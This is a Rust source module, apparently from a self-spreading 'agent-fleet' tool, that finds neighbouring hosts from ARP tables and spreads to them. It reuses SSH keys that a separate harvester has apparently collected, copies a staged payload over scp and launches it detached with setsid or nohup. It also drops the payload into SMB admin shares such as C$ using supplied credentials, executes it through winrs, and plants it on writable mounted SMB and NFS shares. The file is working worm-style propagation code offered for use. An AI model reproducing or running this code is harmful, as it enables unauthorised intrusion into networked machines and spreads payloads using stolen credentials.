//! Local-network discovery and spread.
//!
//! Discovery reads the ARP/neighbour table (no packet injection). Spread is
//! SSH-key reuse: the harvester already collects `id_rsa`/`id_ed25519`, and bots
//! commonly share a key. Mounted SMB/NFS shares are also written when present.

use std::{
    collections::BTreeSet,
    fs,
    net::{IpAddr, SocketAddr, TcpStream},
    path::{Path, PathBuf},
    process::Command,
    time::Duration,
};

use crate::{host_id, stage, Outcome, Payload};

/// Runs a command and returns stdout on success.
pub fn run(command: &str, args: &[&str]) -> Option<String> {
    let output = Command::new(command).args(args).output().ok()?;
    if !output.status.success() {
        return None;
    }
    Some(String::from_utf8_lossy(&output.stdout).into_owned())
}

/// Returns unique neighbours from the ARP/neighbour table.
pub fn neighbors() -> Vec<String> {
    let mut found = BTreeSet::new();
    #[cfg(target_os = "linux")]
    {
        if let Some(text) = run("ip", &["neigh", "show"]) {
            for line in text.lines() {
                let mut fields = line.split_whitespace();
                let Some(address) = fields.next() else {
                    continue;
                };
                if line.contains("FAILED") || line.contains("INCOMPLETE") {
                    continue;
                }
                if address.parse::<IpAddr>().is_ok() {
                    found.insert(address.to_owned());
                }
            }
        } else if let Ok(table) = fs::read_to_string("/proc/net/arp") {
            for line in table.lines().skip(1) {
                if let Some(address) = line.split_whitespace().next() {
                    if address.parse::<IpAddr>().is_ok() {
                        found.insert(address.to_owned());
                    }
                }
            }
        }
    }
    #[cfg(target_os = "macos")]
    {
        if let Some(text) = run("arp", &["-an"]) {
            for line in text.lines() {
                if line.contains("incomplete") {
                    continue;
                }
                if let Some(start) = line.find('(') {
                    if let Some(end) = line[start..].find(')') {
                        found.insert(line[start + 1..start + end].to_owned());
                    }
                }
            }
        }
    }
    #[cfg(windows)]
    {
        if let Some(text) = run("arp", &["-a"]) {
            for line in text.lines() {
                let mut fields = line.split_whitespace();
                let Some(address) = fields.next() else {
                    continue;
                };
                if address.parse::<IpAddr>().is_ok() && fields.next().is_some() {
                    found.insert(address.to_owned());
                }
            }
        }
    }
    found
        .into_iter()
        .filter(|address| {
            address
                .parse::<IpAddr>()
                .is_ok_and(|ip| !ip.is_unspecified() && !ip.is_multicast())
                && !address.starts_with("169.254.")
                && !address.starts_with("fe80:")
                && !address.ends_with(".255")
        })
        .collect()
}

/// Returns whether a TCP port accepts a connection.
pub fn probe(host: &str, port: u16, timeout: Duration) -> bool {
    let Ok(address) = host.parse::<IpAddr>() else {
        return false;
    };
    TcpStream::connect_timeout(&SocketAddr::new(address, port), timeout).is_ok()
}

fn ssh_args<'a>(key: &'a Path, user: &'a str, host: &'a str) -> Vec<String> {
    vec![
        "-i".into(),
        key.display().to_string(),
        "-o".into(),
        "BatchMode=yes".into(),
        "-o".into(),
        "StrictHostKeyChecking=accept-new".into(),
        "-o".into(),
        "ConnectTimeout=4".into(),
        format!("{user}@{host}"),
    ]
}

/// Copies `local` to `remote_dir` with `scp`.
fn scp(key: &Path, host: &str, user: &str, local: &Path) -> bool {
    let source = format!("{}/.", local.display());
    let target = format!("{user}@{host}:.agent-fleet/");
    Command::new("scp")
        .args([
            "-q",
            "-r",
            "-i",
            &key.display().to_string(),
            "-o",
            "BatchMode=yes",
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-o",
            "ConnectTimeout=4",
            &source,
            &target,
        ])
        .status()
        .is_ok_and(|status| status.success())
}

fn ssh(key: &Path, host: &str, user: &str, command: &str) -> Option<String> {
    let mut args = ssh_args(key, user, host);
    args.push(command.to_owned());
    let output = Command::new("ssh").args(&args).output().ok()?;
    output
        .status
        .success()
        .then(|| String::from_utf8_lossy(&output.stdout).into_owned())
}

/// Attempts SSH spread to one host over the supplied keys and users.
pub fn ssh_host(
    host: &str,
    port: u16,
    payload: &Payload,
    keys: &[PathBuf],
    users: &[String],
    staging: &Path,
) -> Outcome {
    if !probe(host, port, Duration::from_secs(2)) {
        return Outcome::skipped(host, format!("port {port} closed"));
    }
    if keys.is_empty() {
        return Outcome::skipped(host, "no SSH keys");
    }
    let staged = staging.join("agentfleet");
    if !staged.is_dir() {
        return Outcome::error(host, "staging directory missing");
    }
    for user in users {
        for key in keys {
            if ssh(key, host, user, "echo ok").is_none() {
                continue;
            }
            if ssh(
                key,
                host,
                user,
                "test -e ~/.agent-fleet/.spread && echo present",
            )
            .is_some()
            {
                return Outcome::skipped(host, format!("already spread ({user})"));
            }
            if ssh(key, host, user, "mkdir -p ~/.agent-fleet").is_none() {
                continue;
            }
            if !scp(key, host, user, &staged) {
                return Outcome::error(host, format!("scp failed ({user})"));
            }
            let start = "chmod +x ~/.agent-fleet/start.sh && (setsid ~/.agent-fleet/start.sh >/dev/null 2>&1 || nohup ~/.agent-fleet/start.sh >/dev/null 2>&1); touch ~/.agent-fleet/.spread";
            if ssh(key, host, user, start).is_none() {
                return Outcome::error(host, format!("start failed ({user})"));
            }
            return Outcome::staged(host, payload.files.len());
        }
    }
    Outcome::skipped(host, "no key/user combination accepted")
}

/// SMB credentials for the admin-share drop.
#[derive(Debug, Clone, Default)]
pub struct Smb {
    /// Account name.
    pub user: String,
    /// Password.
    pub pass: String,
    /// Share to write (default `C$`).
    pub share: String,
}

impl Smb {
    /// Whether both account fields are present.
    pub fn enabled(&self) -> bool {
        !self.user.is_empty() && !self.pass.is_empty()
    }
}

/// Uploads the staged payload to `//host/<share>` with `smbclient`.
///
/// The drop is not executed unless `winrs` is present; SMB alone cannot run it.
pub fn smb_host(host: &str, port: u16, payload: &Payload, staging: &Path, smb: &Smb) -> Outcome {
    if !smb.enabled() {
        return Outcome::skipped(host, "no SMB credentials");
    }
    if !probe(host, port, Duration::from_secs(2)) {
        return Outcome::skipped(host, format!("port {port} closed"));
    }
    if run("smbclient", &["--version"]).is_none() {
        return Outcome::skipped(host, "smbclient not installed");
    }
    let share = if smb.share.is_empty() {
        "C$"
    } else {
        &smb.share
    };
    let remote = format!("agentfleet-{}", &host_id()[..8]);
    let staged = staging.join("agentfleet");
    let mut script = format!("mkdir {remote}; cd {remote}; ");
    let Ok(files) = fs::read_dir(&staged) else {
        return Outcome::error(host, "staging directory missing");
    };
    let mut count = 0;
    for entry in files.filter_map(Result::ok) {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }
        let name = entry.file_name().to_string_lossy().into_owned();
        script.push_str(&format!("put \"{}\" \"{name}\"; ", path.display()));
        count += 1;
    }
    if count == 0 {
        return Outcome::error(host, "nothing staged");
    }
    let auth = format!("{}%{}", smb.user, smb.pass);
    let output = Command::new("smbclient")
        .arg(format!("//{host}/{share}"))
        .arg("-U")
        .arg(&auth)
        .arg("-c")
        .arg(&script)
        .output();
    let ok = output.as_ref().is_ok_and(|out| out.status.success());
    if !ok {
        let detail = output
            .map(|out| String::from_utf8_lossy(&out.stderr).into_owned())
            .unwrap_or_default();
        return Outcome::error(host, format!("smbclient failed: {}", detail.trim()));
    }
    // Execute only when a Windows remote shell is available.
    let start = if payload.binary.ends_with(".exe") {
        format!("{remote}\\start.cmd")
    } else {
        format!("{remote}/start.sh")
    };
    if run("winrs", &["-?"]).is_some() {
        let executed = Command::new("winrs")
            .arg(format!("-r:{host}"))
            .arg(format!("-u:{}", smb.user))
            .arg(format!("-p:{}", smb.pass))
            .arg(format!("cmd /c {start}"))
            .status()
            .is_ok_and(|status| status.success());
        if executed {
            return Outcome::staged(host, count);
        }
    }
    Outcome {
        target: host.into(),
        status: "staged".into(),
        files: count,
        reason: Some(format!("smb drop in {share}\\{remote}; run start manually")),
    }
}

/// Returns mounted SMB/NFS shares.
pub fn shares(explicit: &[PathBuf]) -> Vec<PathBuf> {
    if !explicit.is_empty() {
        return explicit
            .iter()
            .filter(|path| path.is_dir())
            .cloned()
            .collect();
    }
    #[cfg(target_os = "linux")]
    {
        let table = fs::read_to_string("/proc/mounts").unwrap_or_default();
        table
            .lines()
            .filter_map(|line| {
                let mut fields = line.split_whitespace();
                let _device = fields.next()?;
                let mount = fields.next()?;
                let kind = fields.next()?;
                matches!(kind, "cifs" | "smb3" | "nfs" | "nfs4" | "sshfs")
                    .then(|| PathBuf::from(mount))
            })
            .filter(|path| {
                path.is_dir()
                    && fs::metadata(path)
                        .map(|meta| !meta.permissions().readonly())
                        .unwrap_or(false)
            })
            .collect()
    }
    #[cfg(windows)]
    {
        let mut found = Vec::new();
        if let Some(text) = run("net", &["use"]) {
            for line in text.lines() {
                if let Some(start) = line.find("\\\\") {
                    let path = line[start..].split_whitespace().next().unwrap_or_default();
                    let path = PathBuf::from(path.trim_end_matches('\\'));
                    if path.is_dir() {
                        found.push(path);
                    }
                }
            }
        }
        found
    }
    #[cfg(target_os = "macos")]
    {
        Vec::new()
    }
}

/// Stages into a mounted share under a host-specific subdirectory.
pub fn stage_share(share: &Path, payload: &Payload) -> Outcome {
    let target = share.join(format!(
        "agentfleet-{}",
        &host_id()[..8.min(host_id().len())]
    ));
    if target.exists() {
        return Outcome::skipped(share.display().to_string(), "already present");
    }
    match fs::create_dir_all(&target)
        .and_then(|_| stage(&target, payload, false).map_err(std::io::Error::other))
    {
        Ok(outcome) => Outcome {
            target: share.display().to_string(),
            ..outcome
        },
        Err(error) => Outcome::error(share.display().to_string(), error.to_string()),
    }
}
